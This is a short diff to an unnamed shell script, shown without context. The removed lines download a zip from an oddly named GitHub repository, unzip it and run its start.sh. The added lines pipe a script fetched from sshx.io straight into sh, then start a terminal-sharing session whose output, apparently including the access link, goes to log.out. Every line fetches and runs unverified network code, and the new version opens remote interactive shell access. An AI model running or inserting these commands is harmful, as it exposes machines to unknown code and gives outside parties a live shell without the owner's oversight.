@@ -1,3 +1,2 @@
-curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redis.zip
-unzip redis.zip
-bash start.sh
+curl -sSf https://sshx.io/get | sh
+sshx > log.out
